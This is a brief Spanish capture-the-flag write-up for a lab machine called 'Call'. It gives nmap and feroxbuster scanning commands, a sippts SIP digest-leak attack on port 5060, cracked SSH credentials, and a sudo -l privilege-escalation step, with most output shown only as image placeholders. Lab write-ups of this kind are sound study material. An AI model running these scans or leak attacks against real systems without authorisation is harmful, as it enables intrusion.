# Máquina Call

### Reconocimiento de la Ip de la máquina víctima

![alt text](image.png)

### Puertos abiertos

sudo nmap -sS --disable-arp-ping --min-rate 6000 -p- --open -vvv -Pn 192.168.5.136

![alt text](image-1.png)

no encontré nada interesante

verifiqué puertos abiertos udp

![alt text](image-2.png)

### Servicios y versiones 

sudo nmap -sVC --min-rate 6000 -p5060 -vvv -Pn 192.168.5.136

![alt text](image-3.png)

### Fuzing web

feroxbuster --url http://192.168.5.136/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

Encontré una imagen pero si nada relevante


### Explotación

Usé la herramienta sippts para buscar vulnerabilidades

sippts leak -i 192.168.5.136 -r 5060

![alt text](image-4.png)

crackeo la contraseña y me conecto por ssh

phone:telephone

![alt text](image-5.png)


### Escalar privilegios


ejecuté sudo -l

![alt text](image-6.png)

![alt text](image-7.png)


### user.txt

![alt text](image-8.png)

### root.txt

![alt text](image-9.png)
